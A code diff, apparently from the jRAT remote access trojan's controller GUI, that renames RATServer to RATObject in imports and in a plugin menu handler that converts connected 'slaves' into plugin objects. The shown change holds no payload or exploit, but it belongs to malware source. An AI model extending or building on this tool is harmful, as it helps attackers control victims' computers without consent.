@@ -42,7 +42,7 @@ import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
 
 import org.jrat.project.api.RATMenuItem;
-import org.jrat.project.api.RATServer;
+import org.jrat.project.api.RATObject;
 
 import com.redpois0n.Constants;
 import com.redpois0n.Help;
@@ -65,7 +65,7 @@ import com.redpois0n.packets.outgoing.Packet40Thumbnail;
 import com.redpois0n.packets.outgoing.Packet45Reconnect;
 import com.redpois0n.plugins.Plugin;
 import com.redpois0n.plugins.PluginLoader;
-import com.redpois0n.plugins.RATServerFormat;
+import com.redpois0n.plugins.RATObjectFormat;
 import com.redpois0n.settings.Settings;
 import com.redpois0n.settings.Statistics;
 import com.redpois0n.ui.components.DraggableTabbedPane;
@@ -1543,9 +1543,9 @@ public class Frame extends BaseFrame {
 					item.addActionListener(new ActionListener() {
 						public void actionPerformed(ActionEvent e) {
 							List<Slave> list = Util.getSlaves();
-							List<RATServer> servers = new ArrayList<RATServer>();
+							List<RATObject> servers = new ArrayList<RATObject>();
 							for (int i = 0; i < list.size(); i++) {
-								servers.add(RATServerFormat.format(list.get(i)));
+								servers.add(RATObjectFormat.format(list.get(i)));
 							}
 
 							en.getListener().onClick(servers);
